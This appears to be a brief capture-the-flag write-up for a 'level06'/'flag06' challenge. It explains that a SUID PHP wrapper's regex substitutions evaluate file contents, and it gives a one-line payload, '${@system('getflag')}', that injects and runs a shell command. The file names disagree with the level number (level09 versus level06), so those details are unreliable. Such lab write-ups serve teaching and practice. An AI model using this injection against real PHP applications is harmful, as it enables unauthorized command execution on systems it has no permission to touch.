# flag06

The home directory contains 2 files:
- a `level09.php` php file
- a `level09` suid executable of `level09.php`


`level09.php` is a series of regex that modify and try to interpret the contents of the given file

after some fiddling around, we got to this command:
`echo '[x ${@system('getflag')}]' > /run/shm/wow; ./level06 /run/shm/wow`

which puts up an error and interprets our `system('getflag')` and prints the levels flag